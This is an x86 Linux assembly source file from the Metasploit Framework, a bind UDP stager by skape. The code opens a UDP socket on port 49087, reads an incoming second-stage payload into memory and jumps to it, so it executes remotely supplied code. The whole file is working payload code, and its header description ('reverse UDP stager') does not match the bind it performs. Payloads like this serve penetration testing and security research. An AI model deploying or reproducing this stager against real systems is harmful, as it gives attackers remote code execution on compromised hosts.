;;
; 
;        Name: stager_sock_bind_udp
;   Qualities: Can Have Nulls
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1407 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux reverse UDP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx

socket:
	push ebx
	push byte 0x2
	push byte 0x2
	inc  ebx
	push byte 0x66
	pop  eax
	cdq
	mov  ecx, esp
	int  0x80
	xchg eax, esi

bind:
	pop  ebx
	push edx
	push word 0xbfbf ; port: 49087
	push bx
	mov  ecx, esp
	push byte 0x66
	pop  eax
	push eax
	push ecx
	push esi
	mov  ecx, esp
	int  0x80

%ifndef USE_SINGLE_STAGE

recv:
	pop  ebx
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	mov  edi, ebx         ; not necessary if second stages use ebx instead of 
	                      ; edi for fd
	jmp  ecx
%else
	%ifdef FD_REG_EBX
	pop  ebx
	%else
	pop  edi
	%endif
%endif
